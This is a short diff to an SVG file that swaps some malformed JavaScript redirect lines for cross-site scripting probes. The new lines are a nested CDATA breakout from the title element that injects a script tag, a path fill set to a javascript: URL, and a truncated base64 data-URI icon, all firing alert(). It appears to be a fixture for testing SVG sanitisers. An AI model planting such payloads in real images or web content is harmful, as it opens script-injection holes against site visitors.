@@ -1,5 +1,11 @@
 <svg xmlns="http://www.w3.org/2000/svg" width="500" height="500">
-  window.name = "img src=x onerror=alert()>"
-  location.href = "https://example.com?redirect=javascript:window.name"
-  window.location.href="javascript:'this text will be <b>reflected</b>'"  
+  <link rel="icon" href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53..."/>
+  <title><![CDATA[
+    <![CDATA[
+    </title><script>alert(1)</script><title>
+  ]]>
+  </title>
+  <path d='M10 10 H 90 V 90 H 10 Z' fill="url(javascript:alert(1))"/>
+  <title>Example</title>
+  
 </svg>
